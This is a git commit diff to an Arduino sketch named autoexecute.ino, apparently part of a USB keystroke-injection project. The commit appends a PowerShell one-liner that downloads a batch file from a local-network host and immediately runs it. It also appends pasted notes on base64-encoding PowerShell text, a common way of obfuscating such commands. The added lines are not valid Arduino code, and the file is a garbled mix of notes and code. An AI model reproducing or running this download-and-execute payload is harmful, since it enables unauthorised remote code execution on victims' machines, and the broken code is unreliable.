a73b10fa4142e26d1ebc361d36037dfef4f9cf9b
fireorb <31089448+fireorb@users.noreply.github.com>
2017-12-31 16:22:07 +0900

    Update autoexecute.ino

--- autoexecute.ino
+++ autoexecute.ino
@@ -16,3 +16,21 @@ void setup()
 void loop() {
   
 }
+(New-Object System.Net.WebClient).DownloadFile('http://192.168.12.1/a.txt','a.bat');Start-Process 'a.bat'
+  
+      $Text = ‘This is a secret and should be hidden’
+    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+    $EncodedText =[Convert]::ToBase64String($Bytes)
+    $EncodedText
+
+The result is this base64 encoded text:
+VABoAGkAcwAgAGkAcwAgAGEAIABzAGUAYwByAGUAdAAgAGEAbgBkACAAcwBoAG8AdQBsAGQAIABiAGUAIABoAGkAZABlAG4A
+
+Decoding:
+Decoding the base64 encoded blob using PowerShell is simple.
+
+    $EncodedText = “VABoAGkAcwAgAGkAcwAgAGEAIABzAGUAYwByAGUAdAAgAGEAbgBkACAAcwBoAG8AdQBsAGQAIABiAGUAIABoAGkAZABlAG4A”
+    $DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
+    $DecodedText
+
+ 
